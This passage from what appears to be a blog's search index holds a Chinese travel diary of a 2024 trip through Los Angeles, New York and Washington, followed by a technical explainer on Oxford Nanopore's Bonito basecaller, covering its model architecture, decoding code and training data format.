早上我们先去了Griffith Observatory，如果去得早（早上10AM之前到可以考虑直接把车停山路上，晚一点的话可以停在山下的Greek Theater Parking。\nGriffith Observatory主楼 LA DownTown，典型的“摊大饼”规划 远处（右侧）似乎着火了 中午我们和朋友在Maccheroni Republic尝试了意大利菜（面），虽然卖相不太好，但吃起来还是不错的 Downtown一景 随后我们驱车前往了Getty Center，主要展出了一些古典和当代艺术品。Getty的古典艺术品感觉基本出自欧洲，和在欧洲的一些皇宫中能看到的艺术品有些类似。\nWalt Disney Concert Hall Getty Center（左侧山上） Getty小火车 I-405和洛杉矶Downtown 北馆的贴纸 傍晚笔者则去了Santa Monica Pier，相信很多人是在GTA系列游戏里第一次了解这个地方的，游戏里的码头也和真实世界里的Santa Monica Pier布局基本一致。\nSanta Monica的车位比较紧俏并且收费贵，停车可以考虑停在隔一条街的Parking Structure之一，似乎如果停车不到一个小时还是免费的。\n远观Santa Monica Pier Santa Monica Pier的停车场 码头上的游乐设施 太平洋的日落 Day 7 洛杉矶市区 早上笔者先去了Hollywood标志转了一圈，由于标志在山上，手机拍照看起来会比较小。\nHollywood标志 中午和朋友去USC的校园逛了一圈，USC校园面积不大，建筑风格也挺统一。\n朋友带我们去吃了K-Town内的Sun Nong Dan，大概是韩国风格铁板牛骨和牛骨汤，其中有一道菜店员会给菜点个火来完成最后的加热 USC校园 傍晚去了LAX机场附近知名的In-N—Out Burger，这里距离跑道非常近，可以一边吃汉堡一边看飞机。\nLAX In-N—Out Burger LAX In-N—Out Burger看到的飞机 BA的A380 AVIS的停车场 机场入口的LAX标志 为了节省住宿，当晚我们定了当天最晚的一班LAX-EWR航班，相当于在飞机上休息5小时，第二天早上到达纽约。\n飞机是一架接近30年机龄的777-200，座椅间距比飞洲际的777要短一些，也没有IFE，不过飞机上有Wi-Fi Day 8 纽约 到达EWR之后，我们乘坐了Newark Airport Express大巴进城，大巴需要提前网上买票或者现场给售票员现金（22.5USD），进城大概需要1小时（虽然我一直在睡觉，没啥感觉）。如果不堵车的话，相比需要换乘的AirTrain和NJ Trainsit会舒服一点。\n由于当天太困了，我们除了去看了Harry Porter的剧之后就回到了酒店休息。\nTime Square Day 9 纽约 42 St 地铁站 DownTown 下城景点（美旅通） 本日上午我们先去了曼哈顿岛的南部（下城）。\n地铁站，纽约地铁的一个奇怪的设计是出口全部用名字表示，没有编号，这让游客找出口有些不便 纽约的地铁实施一票制，刷信用卡入闸即可，在部分车站也支持虚拟换乘。\n地铁站的出口标识 考虑到时间所限，我们没有去坐船上岛看自由女神像，在Battery Park看的话距离就比较远了，同时因为Battery Park在维修，海边全部被栏杆围了起来，只有有限的几个角度能看到。\nBattery Park看自由女神像 离开Battery Park之后，沿着Broadway这条路往北走，就可以经过华尔街，NYSE等地点。\n华尔街铜牛 Trinity Church NYSE 布鲁克林大桥 走到Fulton St站之后可以坐一站地铁到High St，再经过布鲁克林大桥走回曼哈顿岛。\nBrooklyn District 布鲁克林大桥 中午我们在Nemesis吃了东南亚餐 无畏号航母博物馆 下午笔者和同学去逛了无畏号航母博物馆（USS Intrepid (CV 11)），结构比较类似于深圳曾经的明斯克航母博物馆，都是停泊的退役航母，航母边还有一些其他的航空器展示。\n协和客机 航母上展示的飞机和曼哈顿岛 傍晚返回酒店前还去Grand Central逛了一圈，这里主要接发的是MTA地铁和LIRR通勤铁路。\nGrand Central 纽约的另一特色是用于供暖的蒸汽系统，不过由于年久失修，路面上经常能看到从破裂管道中冒出的蒸汽。\n地下蒸汽系统 Day 10 纽约 联合国总部 上午笔者先去参观了联合国。参观联合国需要提前预约和购票。当天导览开始前1h需要先去联合国总部对面的Visitor Check-in Office凭参观人的护照领取标签，随后前往主楼安检后即可进入。\n联合国大厦和对门的美国驻联合国使团 Non-Violence雕塑 导览大约持续1个小时，如果当天没有会议，导览人员将会带大家参观几个主要的议事厅。\n经济和社会理事会（ECOSOC）的会议室 议事大厅 大都会博物馆 下午笔者则去了大都会博物馆，由于入馆的时间有点晚（距离闭馆只有1.5h了），我们就按照Met官网上的「An Hour at The Met」指南参观了一些著名的展品。不过这个网站在笔者写博客的时候已经被删掉了，不太清楚原因。这个导览的网页可以在web archive上查看。或者也可以去博物馆官网上关注游览当天有什么tour，再进行安排。\n大都会博物馆门口的黄色出租车 The Temple of Dendur Charles Engelhard Court，展出的主要是欧洲古典雕塑 E 82nd St 中央公园 我们一直待到了博物馆闭馆才离开，离开博物馆后，笔者随后前往了中央公园。公园本身没有特别的地方，与内地许多的市内公园也有些类似，可能主要在于公园建设在了寸土寸金的曼哈顿岛上吧。\n中央公园一景 走到哥伦布圆环附近之后有些下雨，在树旁边躲了一会 哥伦布圆环，也是美国对G3签证持有者的地域限制的中心（限制持有者只能在哥伦布圆环为圆心的25英里的范围活动） Central Park Tower Woolworth Building和下方的USPS Day 11 纽约-华盛顿 由于笔者想多体验一种北美的公共交通工具，因此我们选择了乘坐火车从纽约前往华盛顿。从纽约前往华盛顿有三种车型可选：Northeast Regional，Silver Meteor和Acela。其中Northeast Regional，Silver Meteor是可以开到200km/h的普速列车，Acela是可以开到250km/h的高铁。价格上也是前两者会更便宜。如果对时间没有很严格的要求，读者可以考虑购买Northeast Regional，这一级别的车提前1-2个月购票只需要25USD就可以从纽约坐到华盛顿，对比地铁等交通工具的收费可以说是非常便宜了。\nNY Penn Station，这个车站2023年刚刚翻新过。和内地一样，车站在开车前10分钟左右才会放人下电梯到站台 Northeast Regional列车 Northeast Regional列车卖的票不分配座位，座位先到先得。每个车厢有一半的座位会是倒坐。\n站牌 车内的窗户比较小，但座椅很宽，基本相当于内地高铁一等座座椅的宽度了。每排座位都有充电插头等设施 列车开动之后，会有检票员来会查票（电子票扫二维码），查完票之后，检票员会在座位头顶放一张卡片（纸质车票时代应该是直接把车票插在座位头顶），代表这个座位已经被查票并占用了。\n经过费城附近的一个车辆段 到达华盛顿站，有意思的是到华盛顿之前乘务员说因为安全原因，在特区内需要锁定列车的厕所 Union Station地铁站 地铁列车，相比纽约的列车会新一些 华盛顿的地铁需要刷SmartTrip卡入闸，卡可以在Apple Pay里开（有开卡费），也可以在自助售票机用信用卡买（买了之后可以吸进手机，可以获得纪念卡一张）。\nSampannee，也是一个泰餐馆，分量挺大的。我们最开始没意识到它的份量，结果打包了一半回去吃 Day 12 白宫，华盛顿纪念碑 白宫 从北侧拍摄的白宫 从南侧拍摄的白宫，近处是一辆特勤局的警车 华盛顿纪念碑 华盛顿纪念碑电梯登顶和楼顶的博物馆需要提前一个月预约。访客可以登陆www.recreation.gov的网站预约，时间到了进去选时间并且交1USD的预约费即可。如果时间紧张，每天的早上纪念碑下也会派发现场票，但可能就要比较早去了。 参观纪念碑的时候需要先经过安检（和机场安检的规格类似），随后乘坐纪念碑内部的电梯上到顶部的一个博物馆。博物馆里有一些介绍纪念碑的建设与维护的展板，和可以看到纪念碑四周景观的小窗户。\n华盛顿纪念碑，碑身正好把太阳挡住了 纪念碑入口处 东侧，可以看到国会山 西北侧，可以看到椭圆草坪和白宫 北侧，可以看到白宫 南侧，可以看到Tidal Basin，还能看到DCA机场起飞的飞机 Smithsonian National Museum of Natural History Smithsonian自然博物馆以生物标本和地理矿石为主，藏品可以说是非常丰富，尤其是矿石，基本上市面上能看到的矿石博物馆里都有展出样品。\n史密斯博物馆中心的象标本，右下角有一队日本学生正在排队参观，参观的途中遇到了挺多的日韩中小学生 National Mall National Mall即指国会大厦和林肯纪念堂中间的这一大片草坪和建筑群。\nLincoln Memorial Reflecting Pool，这个池子在《阿甘正传》在内的许多电影中都出现过 林肯纪念堂 一些街景，自行车道设置在了路中间 Departmen of State Day 13 国会大厦，图书馆，美术馆，航空博物馆 国会，国会图书馆 国会和国会图书馆是相连的，入内需要在网站上预约。导览的流程是讲解员会先带大家看一段介绍国会制度的影片，随后讲解员带大家去大厅转一圈，会议室似乎需要另外找国会议员才能入内。\n国会访客中心 国会大厦的圆顶，内部摆放了每个州赠送的雕塑，听讲解员说这个雕塑还会经常性更换 国会图书馆的圆顶 国会图书馆 国会大厦餐厅，一般西餐食堂水准 国会大厦东侧 国会大厦西侧，也是总统就职典礼举办的地方。当天降了半旗，但没有找到具体的原因（或许是某位议员去世了） 国家美术馆 Alexander Calder建造的Monumental Mobile，在空调的风吹下，雕塑会慢慢转动 Smithsonian National Air and Space Museum Smithsonian航空博物馆有两个馆，一个在市内，一个在IAD机场旁边。市内的展馆相对来说更具有科普性质一些，体验项目较多，而机场旁边的展馆则更大，有更多飞机模型（包括SR71，航天飞机等）。因为时间安排，笔者只去了市内的博物馆。\n博物馆内的飞机 一辆蓝色的校车 Day 14 返程 笔者的返程行程是乘坐美国联合航空，先从华盛顿杜勒斯IAD飞到旧金山SFO，随后乘坐新航的航班至新加坡SIN，最后转机回香港HKG。这一大段航程在飞机上的时间加起来都已经接近24小时了。\n美联航的737-900，也加装了小翼 Welcome To SFO （可惜在走的时候才拍到） SFO机场内各种各样的美联航客机 从新加坡起飞，返回香港 总结 + 驾驶体验：北美的驾驶习惯和道路参与者密度小于内地，开车时相对来说精神不用那么紧绷。 无障碍设施：北美大城市的无障碍设施和自行车道做的很不错，城市道路都配置了自行车道，人行道也做了缓坡（人车混行的深圳应该好好学习）。 - 生活物价：北美的物价远高于内地，尤其是餐饮，大致可以达到1USD=2.5CNY的水平。 小费文化 治安：北美的治安不如内地及东亚城市，在湾区笔者亲眼看到了玻璃被砸破的车。湾区路上的和纽约地铁里的流浪汉也比内地及东亚城市多，有些流浪汉会大喊大叫，会显得有些攻击性。 互联网速度：这点是出乎我的意料的，北美许多酒店的Wi-Fi速度相较为缓慢（只有约10Mbps的下行速度），这个可能跟许多建筑还在使用同轴电缆上网有关系。 ","permalink":"https://blog.sparktour.me/posts/2024/10/03/2024-summer-usa-travel-notes/","summary":"\u003cp\u003e这篇博客分享笔者于2024年暑假的美国旅行，笔者在本次时长两周的旅行中去到了西海岸的旧金山，洛杉矶和东海岸的纽约，华盛顿在内的美国城市。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"路线与景点图\"\u003e路线与景点图\u003c/h2\u003e\n\u003cp\u003e笔者大致的行程是从旧金山开车到洛杉矶，随后乘飞机前往纽约，乘火车前往华盛顿，最后乘飞机返回旧金山。\u003c/p\u003e","title":"美国旅行游记"},{"content":" 本文将随笔者的研究进展持续更新。目前计划添加的内容有：\n训练的数据集格式和一些技巧 CRF的原理解释 Bonito Basecaller 概述 Bonito（中文直译为鲣鱼，ont很喜欢拿鱼的名字作为软件包的名字）是Oxford Nanopore Technology开发的一款basecaller框架（使用bonito训练的basecaller权重可以被导出至dorado，guppy等使用）。苦于互联网上对basecaller的定性描述文章较少，笔者在研究这些basecaller的架构和数据流时花费了许多的时间与精力。因此在本文中，笔者尽量以通俗易懂的语言，介绍bonito的一些数据流和数据格式等二次开发bonito（甚至是其他的纳米孔测序basecaller）需要了解的一些知识，希望能给后来者一些启发。\n什么是Basecaller？ 简单来讲，Basecaller是一个神经网络，他的输入是纳米孔测序时，碱基通过纳米孔时得到的电流，输出是ATCG碱基以及一些其他的调试信息。在ONT的商业套装中，电流一般被存储为fast5格式（基于hdf5）和近两年推出的pod5格式。不管是哪种格式，存储的数据结构都至少包括了以下的一些信息：\n存储的项目 说明 read_id uuid，用于标识唯一序列用 原始电流（raw） 从放大器中直接输出的采样值，没有单位 scale，offset 放大系数和偏移系数，通过pA_val = scale * (raw + offset)可以得到以pA为单位的电流 metadata 和测序相关的一些信息，如时间，使用的试剂盒，测序flowcell等 有读者可能会注意到，纳米孔测序的电流与语音识别的音频信号有些相似：比如，录入麦克风的声音也是以一维数组存储的；同时，Basecaller输出的ATCG也和语音识别网络（ASR）得到的文字转写（transcript）类似。因此，我们也可以认为纳米孔测序中的Basecaller是一个特殊的ASR网络。\nBonito的架构 本节引用的代码均已列出了具体的github repo和commit，读者可以对照源代码进行阅读。 以下是torchinfo输出的模型架构图（dna_r9.4.1_e8_hac@v3.3, state_len=4），模型的输入为[64,5000](batchsize, current_length)\n========================================================================================== Layer (type:depth-idx) Output Shape Param # ========================================================================================== Model [64, 1000, 1024] -- ├─Sequential: 1-1 [64, 1000, 1024] -- │ └─Convolution: 2-1 [64, 4, 5000] -- │ │ └─Conv1d: 3-1 [64, 4, 5000] 24 │ │ └─Swish: 3-2 [64, 4, 5000] -- │ └─Convolution: 2-2 [64, 16, 5000] -- │ │ └─Conv1d: 3-3 [64, 16, 5000] 336 │ │ └─Swish: 3-4 [64, 16, 5000] -- │ └─Convolution: 2-3 [64, 384, 1000] -- │ │ └─Conv1d: 3-5 [64, 384, 1000] 117,120 │ │ └─Swish: 3-6 [64, 384, 1000] -- │ └─Permute: 2-4 [1000, 64, 384] -- │ └─LSTM: 2-5 [1000, 64, 384] -- │ │ └─LSTM: 3-7 [1000, 64, 384] 1,182,720 │ └─LSTM: 2-6 [1000, 64, 384] -- │ │ └─LSTM: 3-8 [1000, 64, 384] 1,182,720 │ └─LSTM: 2-7 [1000, 64, 384] -- │ │ └─LSTM: 3-9 [1000, 64, 384] 1,182,720 │ └─LSTM: 2-8 [1000, 64, 384] -- │ │ └─LSTM: 3-10 [1000, 64, 384] 1,182,720 │ └─LSTM: 2-9 [1000, 64, 384] -- │ │ └─LSTM: 3-11 [1000, 64, 384] 1,182,720 │ └─Permute: 2-10 [64, 1000, 384] -- │ └─LinearCRFEncoder: 2-11 [64, 1000, 1024] -- │ │ └─Linear: 3-12 [64, 1000, 1024] 394,240 │ │ └─Tanh: 3-13 [64, 1000, 1024] -- ========================================================================================== Total params: 6,425,320 Trainable params: 6,417,640 Non-trainable params: 7,680 Total mult-adds (G): 386.11 ========================================================================================== Input size (MB): 0.64 Forward/backward pass size (MB): 877.57 Params size (MB): 12.85 Estimated Total Size (MB): 891.06 ========================================================================================== Fig. 1 如Marcus等人文章中的图1所示，bonito（和一些常见的basecaler）的模型结构主要分为三大部份：CNN，LSTM/RNN等Encoder和CTC/CRF等Decoder。\nbonito/bonito/crf/model.py at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub\ndef rnn_encoder(n_base, state_len, insize=1, first_conv_size=4, stride=5, winlen=19, activation=\u0026#39;swish\u0026#39;, rnn_type=\u0026#39;lstm\u0026#39;, features=768, scale=5.0, blank_score=None, expand_blanks=True, num_layers=5, norm=None): rnn = layers[rnn_type] return Serial([ conv(insize, first_conv_size, ks=5, bias=True, activation=activation, norm=norm), conv(first_conv_size, 16, ks=5, bias=True, activation=activation, norm=norm), conv(16, features, ks=winlen, stride=stride, bias=True, activation=activation, norm=norm), Permute([2, 0, 1]), *(rnn(features, features, reverse=(num_layers - i) % 2) for i in range(num_layers)), LinearCRFEncoder( features, n_base, state_len, activation=\u0026#39;tanh\u0026#39;, scale=scale, blank_score=blank_score, expand_blanks=expand_blanks ) ]) 配置文件（a.k.a config.toml） 以dna_r9.4.1_e8_hac@v3.3 （基于 bonito/bonito/models/configs/dna_r9.4.1@v3.1.toml at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub ）为例：\n[global_norm] # State Length of CRF, determine how many state CRF decoder need to consider state_len = 4 [input] features = 1 [labels] labels = [ \u0026#34;N\u0026#34;, \u0026#34;A\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;T\u0026#34;,] # labels of bases, N means empty state. [qscore] scale = 0.9356 bias = -0.1721 # bias factor of Q Score [model] package = \u0026#34;bonito.crf\u0026#34; # use CRF or CTC at decoder (since bonito v0.4, only CRF is valid) [encoder] scale = 5.0 rnn_type = \u0026#34;lstm\u0026#34; winlen = 19 features = 384 activation = \u0026#34;swish\u0026#34; stride = 5 # downsample stride blank_score = 2.0 [basecaller] # config when basecalling, don\u0026#39;t affect training batchsize = 512 chunksize = 10000 overlap = 500 CNN 电流的一维数组输入后，首先会经过三次卷积以进行特征提取。卷集的实现代码位于此处，可以看到是标准的pytorch卷积实现（Conv1d — PyTorch 2.4 documentation），没有太特殊的地方。但需要注意的是，bonito为了加快运算速度，在第三层卷积设置了stride为5，令信号被下采样了5倍（5000 -\u0026gt; 1000）。最终，卷积层的输出为[64, 384, 1000] (batch, channel, signal_length)\nbonito/bonito/nn.py at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub\n@register class Convolution(Module): def __init__(self, insize, size, winlen, stride=1, padding=0, bias=True, activation=None, norm=None): super().__init__() self.conv = torch.nn.Conv1d(insize, size, winlen, stride=stride, padding=padding, bias=bias) self.activation = layers.get(activation, lambda: activation)() if isinstance(norm, dict): self.norm = from_dict(norm) elif isinstance(norm, str): self.norm = layers[norm](size) else: self.norm = norm def forward(self, x): h = self.conv(x) if self.norm is not None: h = self.norm(h) if self.activation is not None: h = self.activation(h) return h def to_dict(self, include_weights=False): res = { \u0026#34;insize\u0026#34;: self.conv.in_channels, \u0026#34;size\u0026#34;: self.conv.out_channels, \u0026#34;bias\u0026#34;: self.conv.bias is not None, \u0026#34;winlen\u0026#34;: self.conv.kernel_size[0], \u0026#34;stride\u0026#34;: self.conv.stride[0], \u0026#34;padding\u0026#34;: self.conv.padding[0], } if self.activation is not None: res[\u0026#34;activation\u0026#34;] = self.activation.name if self.norm is not None: res[\u0026#34;norm\u0026#34;] = to_dict(self.norm, include_weights) #simplify default case e.g. norm=\u0026#34;batchnorm\u0026#34; if not include_weights and self.norm.name in layers: if res[\u0026#34;norm\u0026#34;] == to_dict(layers[self.norm.name](res[\u0026#34;size\u0026#34;])): res[\u0026#34;norm\u0026#34;] = self.norm.name if include_weights: res[\u0026#39;params\u0026#39;] = { \u0026#39;W\u0026#39;: self.conv.weight, \u0026#39;b\u0026#39;: self.conv.bias if self.conv.bias is not None else [] } return res LSTM 经过特征提取后的信号经过一个全连接层，随后会进入LSTM层，以学习信号特征在时间上的关系。这里的LSTM也是基于标准的LSTM — PyTorch 2.4 documentation：\nbonito/bonito/nn.py at 91fb1408398fb3d8188621f1486281a2baa76318 · nanoporetech/bonito · GitHub\n@register class LSTM(RNNWrapper): def __init__(self, size, insize, bias=True, reverse=False): super().__init__(torch.nn.LSTM, size, insize, bias=bias, reverse=reverse) def to_dict(self, include_weights=False): res = { \u0026#39;size\u0026#39;: self.rnn.hidden_size, \u0026#39;insize\u0026#39;: self.rnn.input_size, \u0026#39;bias\u0026#39;: self.rnn.bias, \u0026#39;reverse\u0026#39;: self.reverse, } if include_weights: res[\u0026#39;params\u0026#39;] = { \u0026#39;iW\u0026#39;: self.rnn.weight_ih_l0.reshape(4, self.rnn.hidden_size, self.rnn.input_size), \u0026#39;sW\u0026#39;: self.rnn.weight_hh_l0.reshape(4, self.rnn.hidden_size, self.rnn.hidden_size), \u0026#39;b\u0026#39;: self.rnn.bias_ih_l0.reshape(4, self.rnn.hidden_size) } return res LSTM输出层的形状为[1000, 64, 384](signal_length, batch, channel)\nCRF Encoder 数据在离开LSTM后，会进入一个全连接层，以输出一个用于CRF解码的矩阵。从代码可以看到这个Encoder做的只是把数据进行了一次非线性变换，并且对输出进行了重排。\nbonito/bonito/nn.py at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub\n@register class LinearCRFEncoder(Module): def __init__(self, insize, n_base, state_len, bias=True, scale=None, activation=None, blank_score=None, expand_blanks=True, permute=None): super().__init__() self.scale = scale self.n_base = n_base self.state_len = state_len self.blank_score = blank_score self.expand_blanks = expand_blanks size = (n_base + 1) * n_base**state_len if blank_score is None else n_base**(state_len + 1) self.linear = torch.nn.Linear(insize, size, bias=bias) self.activation = layers.get(activation, lambda: activation)() self.permute = permute def forward(self, x): if self.permute is not None: x = x.permute(*self.permute) scores = self.linear(x) if self.activation is not None: scores = self.activation(scores) if self.scale is not None: scores = scores * self.scale if self.blank_score is not None and self.expand_blanks: T, N, C = scores.shape scores = torch.nn.functional.pad( scores.view(T, N, C // self.n_base, self.n_base), (1, 0, 0, 0, 0, 0, 0, 0), value=self.blank_score ).view(T, N, -1) return scores 整个神经网络带权重的部分到此结束。后面的CRF解码器没有包括任何权重。（因此在训练和推理时，bonito使用了不一样的解码器，后面详细解释）\nCRF Decoder CRF Decoder的核心都位于这个函数中：\nbonito/bonito/crf/basecall.py at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub\ndef compute_scores(model, batch, beam_width=32, beam_cut=100.0, scale=1.0, offset=0.0, blank_score=2.0, reverse=False): \u0026#34;\u0026#34;\u0026#34; Compute scores for model. \u0026#34;\u0026#34;\u0026#34; with torch.inference_mode(): device = next(model.parameters()).device dtype = torch.float16 if half_supported() else torch.float32 scores = model(batch.to(dtype).to(device)) if reverse: scores = model.seqdist.reverse_complement(scores) with torch.cuda.device(scores.device): sequence, qstring, moves = beam_search( scores, beam_width=beam_width, beam_cut=beam_cut, scale=scale, offset=offset, blank_score=blank_score ) return { \u0026#39;moves\u0026#39;: moves, \u0026#39;qstring\u0026#39;: qstring, \u0026#39;sequence\u0026#39;: sequence, } 在compute_scores中，scores就是前述神经网络推理出的矩阵，size为[64, 1000, 1024](batch, current_length, state)，$1024=4^5(4base^{4state+1})$。接着，如果测的是RNA，则将score反过来（这也是为什么RNA训练的时候需要把reference fasta反转）。最后，调用koi（一个ONT开发的，不开源的CRF解码包，下面会详细介绍）的beam_search得到moves（输出第几个采样点解码出了碱基，用于碱基序列和电流的对其参考），qstring（Q score string，以数字编码）和sequence（序列，以数字编码）。\n不开源的koi包和其开源替代 自bonito引入CRF解码开始，bonito就将beam search的函数封装进了一个不开源的ont-koi包，这导致了我们无法了解具体的CRF解码实现。但万幸的是，ont在GitHub - davidcpage/seqdist和GitHub - nanoporetech/fast-ctc-decode: Blitzing Fast CTC Beam Search Decoder这两个repo里包含了一些CRF解码的逻辑，同时，ont还在老版bonito中负责处理duplex的部分用前述的开源代码搭出了一个可用的compute_score的工作流：\nbonito/bonito/cli/duplex.py at 91fb1408398fb3d8188621f1486281a2baa76318 · nanoporetech/bonito · GitHub\ndef compute_scores(model, batch, reverse=False): with torch.no_grad(): device = next(model.parameters()).device dtype = torch.float16 if half_supported() else torch.float32 scores = model.encoder(batch.to(dtype).to(device)) if reverse: scores = model.seqdist.reverse_complement(scores) betas = model.seqdist.backward_scores(scores.to(torch.float32)) trans, init = model.seqdist.compute_transition_probs(scores, betas) return { \u0026#39;trans\u0026#39;: trans.to(dtype).transpose(0, 1), \u0026#39;init\u0026#39;: init.to(dtype).unsqueeze(1), } def beam_search_duplex(seq1, path1, t1, b1, seq2, path2, t2, b2, alphabet=\u0026#39;NACGT\u0026#39;, beamsize=5, pad=40, T=0.01): env = build_envelope(t1.shape[0], seq1, path1, t2.shape[0], seq2, path2, padding=pad) return crf_beam_search_duplex( t1, b1, t2, b2, alphabet=alphabet, beam_size=beamsize, beam_cut_threshold=T, envelope=env, ) 笔者同时也参考了Marcus对bonito crf解码的研究，得到了一个利用ont的开源代码实现的compute_score函数。函数主要需要修改两处，列举如下：\n修改backward_scores函数为开源实现（可以用bonito 0.5之前的backward_score实现）： bonito/bonito/crf/model.py at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub\nimport seqdist.sparse from seqdist.ctc_simple import logZ_cupy, viterbi_alignments from seqdist.core import SequenceDist, Max, Log, semiring def backward_scores(self, scores, S: semiring=Log): T, N, _ = scores.shape Ms = scores.reshape(T, N, -1, self.n_base + 1) beta_T = Ms.new_full((N, self.n_base**(self.state_len)), S.one) return seqdist.sparse.bwd_scores_cupy(Ms, self.idx, beta_T, S, K=1) 修改compute_scores函数，记得引入对应的包： from fast_ctc_decode import crf_greedy_search def compute_scores(model, batch, beam_width=32, beam_cut=100.0, scale=1.0, offset=0.0, blank_score=2.0, reverse=False): \u0026#34;\u0026#34;\u0026#34; Compute scores for model. \u0026#34;\u0026#34;\u0026#34; with torch.inference_mode(): device = next(model.parameters()).device dtype = torch.float16 if half_supported() else torch.float32 scores = model(batch.to(dtype).to(device)) if reverse: scores = model.seqdist.reverse_complement(scores) # switch dim 1 \u0026amp; 2 scores_pad = scores.permute(1, 0, 2) # pad score n_base = model.seqdist.n_base T, N, C = scores_pad.shape scores_pad = torch.nn.functional.pad( scores_pad.view(T, N, C // n_base, n_base), (1, 0, 0, 0, 0, 0, 0, 0), value=blank_score ).view(T, N, -1) betas = model.seqdist.backward_scores(scores_pad.to(torch.float32)) trans, init = model.seqdist.compute_transition_probs(scores_pad, betas) trans = trans.to(torch.float32).transpose(0, 1) init = init.to(torch.float32).unsqueeze(1) # offload tracebacks = trans.cpu() init = init.cpu() seq_tensor = torch.zeros((N, T), dtype=torch.uint8, device=\u0026#39;cpu\u0026#39;) qstring_tensor = torch.zeros((N, T), dtype=torch.uint8, device=\u0026#39;cpu\u0026#39;) moves_tensor = torch.zeros((N, T), dtype=torch.uint8, device=\u0026#39;cpu\u0026#39;) for batch_idx in range(N): tracebacks_batch = tracebacks[batch_idx].numpy() # (T, 256, 5) init_batch = init[batch_idx][0].numpy() # (256,) # greedy decode, cef_beam_search dont output qstring seq_batch, path_batch = crf_greedy_search( network_output=tracebacks_batch, init_state=init_batch, alphabet=\u0026#34;NACGT\u0026#34;, qstring=True, qscale=1, qbias=1 ) # re-encode seq_batch_str = seq_batch[:len(seq_batch) // 2] qstring_batch_str = seq_batch[len(seq_batch) // 2:] seq_as_numbers = np.frombuffer(seq_batch_str.encode(), dtype=np.uint8).copy() qstring_as_numbers = np.frombuffer(qstring_batch_str.encode(), dtype=np.uint8).copy() seq_tensor[batch_idx, path_batch] = torch.from_numpy(seq_as_numbers[:len(path_batch)]) qstring_tensor[batch_idx, path_batch] = torch.from_numpy(qstring_as_numbers[:len(path_batch)]) moves_tensor[batch_idx, path_batch] = 1 return { \u0026#39;qstring\u0026#39;: qstring_tensor, \u0026#39;sequence\u0026#39;: seq_tensor, \u0026#39;moves\u0026#39;: moves_tensor, } 需要注意的是，此处的开源实现将beam_search换成了crf_greedy_search，因此basecaller的准确率可能略有下降，但根据笔者的测试，准确率仅下降约0.3%，笔者认为不完美，但可接受。 此时，得到的qstring，sequence是一个长current_length的矩阵。其中部份index为0（说明这个位置并没有解码出新的碱基），剩下的index则是数字（数字编码的ATCG碱基，或q string分数）。\n拼接basecaller结果和输出字符 由于神经网络的窗口大小有限，在遇到长序列的电流时，电流会按照网络配置中给定的chunksize和overlap拆成一段段的短序列。因此，在完成解码后，得到的qstring，sequence和moves需要经过stitch_results函数重新根据read_id拼接在一起。\n在拼接完后，序列则会经过如path_to_str这样的解码函数被解码回碱基序列/Q Score。最后，经过格式化就可以输出为fastq，或过一次mappy之后即可输出aligned sam/bam文件了。\n训练Bonito 数据集结构 参考bonito 0.8.1的官方文档，我们至少需要三个.npy文件才能构成一个训练basecaller的数据集（假设训练时用的每段电流长度为chunksize）。参考bonito的download.py，目前bonito提供了三个训练数据集，列举如下：\nUrl flowcell https://cdn.oxfordnanoportal.com/software/analysis/bonito/example_data_dna_r9.4.1_v0.zip dna_r9.4.1 https://cdn.oxfordnanoportal.com/software/analysis/bonito/example_data_dna_r10.4.1_v0.zip dna_r10.4.1 https://cdn.oxfordnanoportal.com/software/analysis/bonito/example_data_rna004_v0.zip rna004 每个数据集下载下来并解压都包含三个.npy文件：\nFilename Shape 用途 references.npy (data_length, max_len_of_reference) uint8 存储每个信号chunk对应的序列，用诸如{'A': 1, 'C': 2, 'G': 3, 'T': 4}的规则编码ATCG，余下位置用0填充 reference_lengths.npy (data_length,) uint8 存储每个信号chunk对应的序列的长度（不pad0的部分） chunks.npy (data_length, chunksize) float32 存储每个信号chunk的电流讯号 可选的，数据集文件夹中也可以包含一个名为validation_sets的文件夹，如果存在此文件夹，里面的references.npy，reference_lengths.npy，chunks.npy将作为验证集使用。\n训练相关的命令 # bonito train positional arguments: training_directory optional arguments: -h, --help show this help message and exit --config CONFIG --pretrained PRETRAINED --directory DIRECTORY --device DEVICE --lr LR --seed SEED --epochs EPOCHS --batch BATCH --chunks CHUNKS --valid-chunks VALID_CHUNKS --no-amp -f, --force --restore-optim --nondeterministic --save-optim-every SAVE_OPTIM_EVERY --grad-accum-split GRAD_ACCUM_SPLIT --quantile-grad-clip --num-workers NUM_WORKERS 训练时的loss函数计算 和推理时使用的CRF不同，bonito在训练时，使用的解码器和loss函数并不是先前提到的compute_score函数。\nbonito/bonito/crf/model.py at 0c7fcceeeca16e300ba427d737282b33d3cb8ec9 · nanoporetech/bonito · GitHub\ndef decode_batch(self, x): scores = self.seqdist.posteriors(x.to(torch.float32)) + 1e-8 tracebacks = self.seqdist.viterbi(scores.log()).to(torch.int16).T return [self.seqdist.path_to_str(x) for x in tracebacks.cpu().numpy()] 而是用seqdist的viterbi search直接得出了序列，然后跟标准参考序列比较得出了一个准确率。\n训练命令 bonito train \\ --config config.toml \\ # 前面提到的模型config，chunksize等会从数据集里自动读取 --device cuda:0 \\ # 显卡 --epochs 5 # epoch --lr 5e-4 \\ # 学习率 --batch 96 \\ # batchsize --pretrained dna_r10.4.1_e8.2_400bps_hac@v5.0.0 \\ # 现有模型，可以从ont提供的模型选，或者传入其他模型所在的目录 --directory dataset_dir/ \\ # chunks.npy等所在的文件夹 model_dir/ ","permalink":"https://blog.sparktour.me/posts/2024/09/25/a-look-at-nanopore-basecaller-bonito/","summary":"Bonito（中文直译为鲣鱼）是Oxford Nanopore Technology开发的一款basecaller。在本文中，笔者尽量以通俗易懂的语言，介绍bonito的一些数据流和数据格式等二次开发bonito（甚至是其他的纳米孔测序basecaller）需要了解的一些知识。","title":"A Look at the Nanopore Basecaller: 